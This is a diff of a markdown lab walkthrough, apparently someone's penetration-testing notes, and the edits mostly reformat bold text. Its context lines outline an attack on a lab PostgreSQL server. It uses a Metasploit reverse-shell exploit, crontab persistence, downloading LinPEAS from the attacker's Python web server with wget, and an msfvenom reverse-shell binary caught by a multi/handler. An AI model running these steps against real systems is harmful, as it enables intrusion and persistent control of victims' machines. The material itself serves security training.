@@ -11,7 +11,7 @@ Metasploit and Proxychains are essential tools for cybersecurity professionals c
 
 ### (ATTACKER) ON msf6
 
-***Use whatever number that has the most recent date for exploit module.***
+**Use whatever number that has the most recent date for exploit module.**
 
 ```bash
 search postgresql
@@ -23,7 +23,7 @@ Based off the server data in (ATTACKER) (TERM 2) we saw that PostgreSQL is 9.6.0
 search postgresql 9.6.0
 ```
 
-***start from 9.6.0 and back space one character each time to see what you find out***
+**start from 9.6.0 and back space one character each time to see what you find out**
 
 ```
 search postgresql 9.6
@@ -37,8 +37,8 @@ search postgresql 9.
 search postgresql 9
 ```
 
-***use number that has expliot module (it vaires but i used the one ending in "cmd_excec")
-use exploit modules as much as possible.***
+**use number that has expliot module (it vaires but i used the one ending in "cmd_excec")
+use exploit modules as much as possible.**
 LHOST (istening) comming back through our WAN
 RHOST (recieving)
 
@@ -52,7 +52,7 @@ RHOST (recieving)
 searchsploit postgresql
 ```
 
-***(find version)*** 
+**(find version)**
 
 ### (ATTACKER) ON msf6
 
@@ -60,7 +60,7 @@ searchsploit postgresql
 search postgresql
 ```
 
-***LOOKS SOMETHING LIKE THIS:***  exploit(multi/postgress/postgress_copy_from_program_cmd_exec)
+**LOOKS SOMETHING LIKE THIS:** exploit(multi/postgress/postgress_copy_from_program_cmd_exec)
 
 [3:29] DAY 11
 
@@ -72,14 +72,14 @@ set lhost 192.168.122.209
 set rhosts 192.168.1.102
 ```
 
-***USE YOUR DEFAULT PORT***
+**USE YOUR DEFAULT PORT**
 
 ```
 set lport 61775
 ```
 
 
-***Use your manual port for reverse shells***
+**Use your manual port for reverse shells**
 
 
 ```
@@ -90,7 +90,7 @@ show options
 run
 ```
 
-***should get exploit here***
+**should get exploit here**
 
 [3:30] DAY 11
 
@@ -111,15 +111,15 @@ another shell to brake out metasploit (DEFAULT PORT)
 ### (VICTIM)
 
 
-***Create a crontab using python3 shortest with your port 
-number you want to use for VIC2 persistence*** 
+**Create a crontab using python3 shortest with your port 
+number you want to use for VIC2 persistence**
 
 #### (THIS PORT NUMBER IS ONLY FOR SOC4 PERSISTENCE)
 
 
 
 
-***Set up another listner over DEFAULT port***        
+**Set up another listner over DEFAULT port**      
 #### (VIC 2 Persisitence)
 
 [14:02] DAY 12
@@ -156,13 +156,13 @@ ls
 ```
 
 This is a automation script that we will move to the victim this info could be found on hacktricks
-***Checklist Linux Privesc escalation LinPEAS***
+**Checklist Linux Privesc escalation LinPEAS**
 
 ```
 cat linpeas.sh| less
 ```
 
-***(CHECK THEN EXIT)***
+**(CHECK THEN EXIT)**
 
 ```
 ls
@@ -172,10 +172,10 @@ ls
 python3 -m http.server 8000
 ```
 
-***THIS LETS YOU HOST A WEBSERVER WITH PYTHON***
+**THIS LETS YOU HOST A WEBSERVER WITH PYTHON**
 
 
-***Set up another port fowarding rule with this port number because thats where the websever is.***
+**Set up another port fowarding rule with this port number because thats where the websever is.**
 
 #### Type in web browser
 
@@ -183,9 +183,9 @@ python3 -m http.server 8000
 127.0.0.1:8000
 ```
 
-***Were going to download linPEAS to ourselves (ATTACKER) and then access it through the 
+**Were going to download linPEAS to ourselves (ATTACKER) and then access it through the 
 web server from the victim side. Basically hosting linPeas utulizing python throwing it
-up on a webpage and the downloading it from victim.***
+up on a webpage and the downloading it from victim.**
 
 ### (VICTIM)
 
@@ -193,7 +193,7 @@ up on a webpage and the downloading it from victim.***
 wget http://192.168.122.209:8000/linpeas.sh
 ```
 
-***(I WENT TO THE WEBPAGE AND CLICKED THE _linpeas.sh_ LINK)***
+**(I WENT TO THE WEBPAGE AND CLICKED THE _linpeas.sh_ LINK)**
 
 ```
 ls
@@ -219,7 +219,7 @@ chmod u+x linpeas.sh
 ls -al
 ```
 
-***(capture everything you run in TERMINAL)***
+**(capture everything you run in TERMINAL)**
 
 `(ctl a + H)`
 
@@ -253,7 +253,7 @@ mv screenlog.0 linpeas_output
 mv linpeas_output ./Desktop/pentest/internal/192.168.1.102
 ```
 
-***This might not be your file path so just make sure its in "internal"***
+**This might not be your file path so just make sure its in "internal"**
 
 
 `cd [your path to verify]`
@@ -308,7 +308,7 @@ gcc -o exploit_timestamp_race exploit_timestamp_race.c
 
  [2:12:27]
  
-##Section 4: Exploiting arper utullizing msfvenom as a reverse shell.
+## Section 4: Exploiting harper utilizing msfvenom as a reverse shell
 
 ### (ATTACKER) 
 ```
@@ -382,7 +382,7 @@ ls -al | grep clear
 ./clear
 ```
 
-***Open mfsconsole***
+**Open mfsconsole**
 
 ### (ATACKER) (msf6) 
 
@@ -390,7 +390,7 @@ ls -al | grep clear
 search multi handler
 ```
 
-***Use 5 or exploit/multi/handler***
+**Use 5 or exploit/multi/handler**
 
 ```
 set lhost 192.168.122.209
@@ -425,8 +425,7 @@ run
 
 ### (ATACKER) (msf6)
 
-***Go back and check if command shell opened
-then run...***
+**Go back and check if command shell opened then run...**
 
 ```
 id
